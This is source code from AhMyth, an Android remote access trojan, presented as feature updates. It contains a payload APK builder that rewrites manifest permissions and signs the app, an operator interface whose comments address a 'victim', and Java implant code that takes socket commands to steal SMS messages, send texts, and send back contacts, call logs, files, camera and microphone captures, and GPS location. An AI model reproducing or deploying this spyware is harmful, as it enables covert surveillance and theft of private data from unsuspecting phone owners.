<details>
    <summary>Updated "GenerateApk" function</summary>
    
```js
$appCtrl.GenerateApk = async (apkFolder) => {
    if (!$appCtrl.bindApk.enable) {
        var checkBoxofCamera = document.getElementById("Permissions1");
        var checkBoxofStorage = document.getElementById("Permissions2");
        var checkBoxofMic = document.getElementById("Permissions3");
        var checkBoxofLocation = document.getElementById("Permissions4");
        var checkBoxofContacts = document.getElementById("Permissions5");
        var checkBoxofSms = document.getElementById("Permissions6");
        var checkBoxofCallsLogs = document.getElementById("Permissions7");

        // default permissions for the payload
        const permissions = CONSTANTS.permissions;

        // Create an array to store the selected permissions
        var selectedPermissions = [];

        // Check each checkbox and add the corresponding permission to the selectedPermissions array
        if (checkBoxofCamera.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
        }
        if (checkBoxofStorage.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
        }
        if (checkBoxofMic.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
        }
        if (checkBoxofLocation.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
        }
        if (checkBoxofContacts.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
        }
        if (checkBoxofSms.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
        }
        if (checkBoxofCallsLogs.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
        }

        // If all checkboxes are checked, set selectedPermissions to the permissions array from CONSTANTS
        if (
            checkBoxofCamera.checked &&
            checkBoxofStorage.checked &&
            checkBoxofMic.checked &&
            checkBoxofLocation.checked &&
            checkBoxofContacts.checked &&
            checkBoxofSms.checked &&
            checkBoxofCallsLogs.checked
        ) {
            selectedPermissions = permissions;
        }

        // If all checkboxes are unchecked, set selectedPermissions to an empty array
        if (
            !checkBoxofCamera.checked &&
            !checkBoxofStorage.checked &&
            !checkBoxofMic.checked &&
            !checkBoxofLocation.checked &&
            !checkBoxofContacts.checked &&
            !checkBoxofSms.checked &&
            !checkBoxofCallsLogs.checked
        ) {
            selectedPermissions = permissions;
        }

        try {
            delayedLog('[★] Reading the Payload Manifest File...');
            const data = await fs.promises.readFile(dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'), 'utf8');

            try {
                delayedLog('[★] Parsing the Payload Manifest Data...');
                const parsedData = await new Promise((resolve, reject) => {
                    xml2js.parseString(data, (parseError, parsedData) => {
                        if (parseError) {
                            reject(parseError);
                        } else {
                            // Modify the manifest data as needed
                            parsedData.manifest['uses-permission'] = [];
                            parsedData.manifest['uses-feature'] = [];

                            selectedPermissions.forEach(permission => {
                                if (permission === 'android.hardware.camera') {
                                    parsedData.manifest['uses-feature'].push({
                                        $: {
                                            'android:name': 'android.hardware.camera'
                                        }
                                    });
                                }

                                if (permission === 'android.hardware.camera.autofocus') {
                                    parsedData.manifest['uses-feature'].push({
                                        $: {
                                            'android:name': 'android.hardware.camera.autofocus'
                                        }
                                    });
                                }

                                if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                                    parsedData.manifest['uses-permission'].push({
                                        $: {
                                            'android:name': permission
                                        }
                                    });
                                }
                            });

                            resolve(parsedData);
                        }
                    });
                });

                // Convert the modified parsed data back to XML
                const builder = new xml2js.Builder();
                const updatedData = builder.buildObject(parsedData);
                await fs.promises.writeFile(
                    dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'),
                    updatedData,
                    'utf8'
                );
            } catch (parseError) {
                delayedLog('[x] Error occurred while parsing the Payload Manifest:', CONSTANTS.logStatus.FAIL);
                delayedLog('[¡] Reason:', parseError.message); // Display the reason for the error
                delayedLog('[¡] Error written to "Error.log" on', CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }
        } catch (readError) {
            // Handle errors related to reading the file
            delayedLog('[x] Error occurred while reading the Payload Manifest File:', CONSTANTS.logStatus.FAIL);
            delayedLog('[¡] Reason:', readError.message); // Display the reason for the error
            delayedLog('[¡] Error written to "Error.log" on', CONSTANTS.logStatus.INFO);
            delayedLog(logPath, CONSTANTS.logStatus.INFO);
            return;
        }

    }

    try {
        delayedLog('[★] Emptying the Apktool Framework Directory...');
        exec('java -jar "' + CONSTANTS.apktoolJar + '" empty-framework-dir --force "' + '"',
            (error, stderr, stdout) => {
                if (error) throw error;
            });
    } catch (error) {
        // Ignore the error by doing nothing
    }

    // Build the AhMyth Payload APK
    delayedLog('[★] Building ' + CONSTANTS.apkName + '...');
    var createApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath,
        CONSTANTS.apkName) + '" --use-aapt2 "' + '"';
    exec(createApk,
        (error, stdout, stderr) => {
            if (error !== null) {
                delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Building');
                delayedLog('[¡] Error written to "Building.log" on', CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }

            delayedLog('[★] Signing ' + CONSTANTS.apkName + '...');
            var signApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"';
            exec(signApk, (error, stdout, stderr) => {
                if (error !== null) {
                    delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
                    writeErrorLog(error, 'Signing');
                    delayedLog('[¡] Error written to "Signing.log" on ', CONSTANTS.logStatus.INFO);
                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                    return;
                }

                fs.unlink(dir.join(outputPath, CONSTANTS.apkName), (err) => {
                    if (err) throw err;

                    delayedLog('[✓] Payload Built Successfully', CONSTANTS.logStatus.SUCCESS);
                    delayedLog('[¡] The Payload has Been Stored at:', CONSTANTS.logStatus.INFO);
                    delayedLog('[¡] ' + dir.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.INFO);
                    delayedLog();

                    fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                        if (err) throw err;
                    });
                });
            });
        });
};
```
</details>
<br>
<details>
    <summary>Updated SMS Feature</summary>
<br>

- SMSManager.html
```html
<div class="ui top attached tabular menu">
    <a class="item active" data-tab="sendSms">Send SMS</a>
    <a class="item" data-tab="smsList">SMS List</a>
</div>
<div class="ui bottom attached tab segment active h90 center aligned" data-tab="sendSms">
    <br>
    <div class="ui labeled input">
        <div class="ui label">
            TO://
        </div>
        <input type="text" ng-model="phoneNo" placeholder="Phone Number">
    </div>
    <br>
    <label>Message :</label>
    <br>
    <textarea class="w100 h40" ng-model="msg" placeholder="Message to send.."></textarea>
    <br>
    <br>
    <button class="ui labeled icon red button" ng-click="SendSMS(phoneNo,msg)"> <i class="send outline icon"></i>SEND</button>
</div>
<div class="ui bottom attached tab segment h90" data-tab="smsList">
    <div class="ui top attached tabular menu">
        <a class="item active" data-tab="inbox" ng-click="getSMSList('inbox')">Inbox</a>
        <a class="item" data-tab="outbox" ng-click="getSMSList('outbox')">Outbox</a>
    </div>
    <div class="ui bottom attached tab segment h90" data-tab="inbox" style="overflow: scroll; height: 360px;" id="inboxParent">
        <br>
        <table class="ui very compact striped table">
            <thead>
                <tr>
                    <th>
                        <div class="ui label">
                            <i class="mail icon"></i> <span ng-bind="inboxSize"></span>
                            <span class="detail">Messages</span>
                        </div>
                    </th>
                    <th>
                        <div class="right aligned">
                            <a class="ui red label" ng-click="SaveSMS('inbox')">
                                <i class="save icon"></i> Save
                            </a>
                        </div>
                    </th>
                </tr>
            </thead>
            <tbody infinite-scroll="increaseInboxLimit()" infinite-scroll-container='"#inboxParent"'>
                <tr ng-repeat="sms in smsList.inbox | limitTo:inboxBarLimit">
                    <td ng-bind="sms.phoneNo"></td>
                    <td ng-bind="sms.msg"></td>
                </tr>
            </tbody>
        </table>
    </div>

    <div class="ui bottom attached tab segment h90" data-tab="outbox" style="overflow: scroll; height: 360px;" id="outboxParent">
        <br>
        <table class="ui very compact striped table">
            <thead>
                <tr>
                    <th>
                        <div class="ui label">
                            <i class="mail icon"></i> <span ng-bind="outboxSize"></span>
                            <span class="detail">Messages</span>
                        </div>
                    </th>
                    <th>
                        <div class="right aligned">
                            <a class="ui red label" ng-click="SaveSMS('outbox')">
                                <i class="save icon"></i> Save
                            </a>
                        </div>
                    </th>
                </tr>
            </thead>
            <tbody infinite-scroll="increaseOutboxLimit()" infinite-scroll-container='"#outboxParent"'>
                <tr ng-repeat="sms in smsList.outbox | limitTo:outboxBarLimit">
                    <td ng-bind="sms.phoneNo"></td>
                    <td ng-bind="sms.msg"></td>
                </tr>
            </tbody>
        </table>
    </div>
</div>
```
- LabCtrl.js
```javascript
app.controller("SMSCtrl", function($scope, $rootScope) {
  $SMSCtrl = $scope;
  var sms = CONSTANTS.orders.sms;
  $SMSCtrl.smsList = {
    inbox: [],
    outbox: []
  };

  $('.menu .item').tab();

  $SMSCtrl.$on('$destroy', () => {
    // release resources, cancel Listener...
    socket.removeAllListeners(sms);
  });

  // send request to victim to retrieve both inbox and outbox messages
  $SMSCtrl.getSMSList = (type) => {
    $SMSCtrl.load = 'loading';
    $SMSCtrl.barLimit = 50;
    $rootScope.Log('Get SMS list..');
    socket.emit(ORDER, { order: sms, extra: 'ls', type: type });
  };

  $SMSCtrl.increaseLimit = () => {
    $SMSCtrl.barLimit += 50;
  };

  // send request to victim to send SMS
  $SMSCtrl.SendSMS = (phoneNo, msg) => {
    $rootScope.Log('Sending SMS..');
    socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });
  };

  // save SMS list to CSV file
  $SMSCtrl.SaveSMS = (type) => {
    let smsList = $SMSCtrl.smsList[type];
    if (smsList.length === 0) {
      return;
    }

    var csvRows = [];
    for (var i = 0; i < smsList.length; i++) {
      csvRows.push(smsList[i].phoneNo + ',' + smsList[i].msg);
    }

    var csvStr = csvRows.join('\n');
    var csvPath = path.join(downloadsPath, 'SMS_' + Date.now() + '.csv');
    $rootScope.Log('Saving SMS List...');
    fs.outputFile(csvPath, csvStr, (error) => {
      if (error) {
        $rootScope.Log('Saving ' + csvPath + ' Failed', CONSTANTS.logStatus.FAIL);
      } else {
        $rootScope.Log('SMS List Saved on ' + csvPath, CONSTANTS.logStatus.SUCCESS);
      }
    });
  };

  // listen for victim response
  socket.on(sms, (data) => {
    if (data.smsList) {
      $SMSCtrl.load = '';
      $rootScope.Log('SMS list arrived', CONSTANTS.logStatus.SUCCESS);
      $SMSCtrl.smsList[data.type] = data.smsList;
      $scope.$apply();
    } else {
      if (data === true) {
        $rootScope.Log('SMS sent', CONSTANTS.logStatus.SUCCESS);
      } else {
        $rootScope.Log('SMS not sent', CONSTANTS.logStatus.FAIL);
      }
    }
  });
});
```
- SMSManager.java
```java
package ahmyth.mine.king.ahmyth;

import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by AhMyth on 11/10/16.
 */

public class SMSManager {

    public static JSONObject getSMSList(String type) {
        try {
            JSONObject SMSList = new JSONObject();
            JSONArray list = new JSONArray();

            Uri uri;
            if (type.equals("inbox")) {
                // Retrieve inbox SMS messages
                uri = Uri.parse("content://sms/inbox");
            } else if (type.equals("outbox")) {
                // Retrieve outbox SMS messages
                uri = Uri.parse("content://sms/sent");
            } else {
                // Invalid type argument
                return null;
            }

            Cursor cursor = MainService.getContextOfApplication().getContentResolver().query(uri, null, null, null, null);
            while (cursor.moveToNext()) {
                JSONObject sms = new JSONObject();
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                sms.put("phoneNo", address);
                sms.put("msg", body);
                list.put(sms);
            }
            
            SMSList.put("smsList", list);
            Log.e("done", "collecting");
            return SMSList;
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return null;
    }

    public static boolean sendSMS(String phoneNo, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }
    }
}
```
- ConnectionManager.java
```java
package ahmyth.mine.king.ahmyth;

import org.json.JSONException;
import org.json.JSONObject;
import io.socket.emitter.Emitter;

import android.content.Context;
import android.util.Log;
import android.os.Looper;
import android.os.Handler;

import java.lang.reflect.Method;

/**
 * Created by AhMyth on 10/1/16.
 */

public class ConnectionManager {

    public static Context context;

    private static io.socket.client.Socket ioSocket;

    private static FileManager fm = new FileManager();

    public static void startAsync(Context con) {
        try {
            ConnectionManager.context = con;
            sendReq();
        } catch (Exception ex) {
            startAsync(con);
        }
    }

    public static void startContext() {
        try {
            findContext();
        } catch (Exception ignored) {
        }
    }

    private static void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            // No context
            return;
        }
        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
        if (context == null) {
            // Post to the UI/Main thread and try to retrieve the Context
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    try {
                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                        if (context != null) {
                            startAsync(context);
                        }
                    } catch (Exception ignored) {
                    }
                }
            });
        } else {
            startAsync(context);
        }
    }

    public static void sendReq() {
        try {
            if (ioSocket != null)
                return;
            ioSocket = IOSocket.getInstance().getIoSocket();
            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong");
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("order");
                        Log.e("order", order);
                        switch (order) {
                            case "x0000ca":
                                if (data.getString("extra").equals("camList"))
                                    x0000ca(-1);
                                else if (data.getString("extra").equals("1"))
                                    x0000ca(1);
                                else if (data.getString("extra").equals("0"))
                                    x0000ca(0);
                                break;
                            case "x0000fm":
                                if (data.getString("extra").equals("ls"))
                                    x0000fm(0, data.getString("path"));
                                else if (data.getString("extra").equals("dl"))
                                    x0000fm(1, data.getString("path"));
                                break;
                            case "x0000sm":
                                if (data.getString("extra").equals("ls"))
                                    x0000sm(0);
                                else if (data.getString("extra").equals("sendSMS"))
                                    x0000sm(1, data.getString("to"), data.getString("sms"));
                                break;
                            case "x0000cl":
                                x0000cl();
                                break;
                            case "x0000cn":
                                x0000cn();
                                break;
                            case "x0000mc":
                                x0000mc(data.getInt("sec"));
                                break;
                            case "x0000lm":
                                x0000lm();
                                break;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            ioSocket.connect();
        } catch (Exception ex) {
            Log.e("error", ex.getMessage());
        }
    }

    public static void x0000ca(int req) {
        if (req == -1) {
            JSONObject cameraList = new CameraManager(context).findCameraList();
            if (cameraList != null)
                ioSocket.emit("x0000ca", cameraList);
        } else if (req == 1) {
            new CameraManager(context).startUp(1);
        } else if (req == 0) {
            new CameraManager(context).startUp(0);
        }
    }

    public static void x0000fm(int req, String path) {
        if (req == 0)
            ioSocket.emit("x0000fm", fm.walk(path));
        else if (req == 1)
            fm.downloadFile(path);
    }

    public static void x0000sm(int req) {
        if (req == 0) {
            JSONObject smsListInbox = SMSManager.getSMSList("inbox");
            JSONObject smsListOutbox = SMSManager.getSMSList("outbox");
            JSONObject smsLists = new JSONObject();
            try {
                smsLists.put("inbox", smsListInbox);
                smsLists.put("outbox", smsListOutbox);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            ioSocket.emit("x0000sm", smsLists);
        }
    }

    public static void x0000sm(int req, String phoneNo, String msg) {
        if (req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit("x0000sm", isSent);
        }
    }

    public static void x0000cl() {
        ioSocket.emit("x0000cl", CallsManager.getCallsLogs());
    }

    public static void x0000cn() {
        ioSocket.emit("x0000cn", ContactsManager.getContacts());
    }

    public static void x0000mc(int sec) throws Exception {
        MicManager.startRecording(sec);
    }

    public static void x0000lm() throws Exception {
        Looper.prepare();
        LocManager gps = new LocManager(context);
        JSONObject location = new JSONObject();
        // Check if GPS is enabled
        if (gps.canGetLocation()) {
            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            Log.e("loc", latitude + " , " + longitude);
            location.put("enable", true);
            location.put("lat", latitude);
            location.put("lng", longitude);
        } else {
            location.put("enable", false);
        }
        ioSocket.emit("x0000lm", location);
    }
}
```
</details>
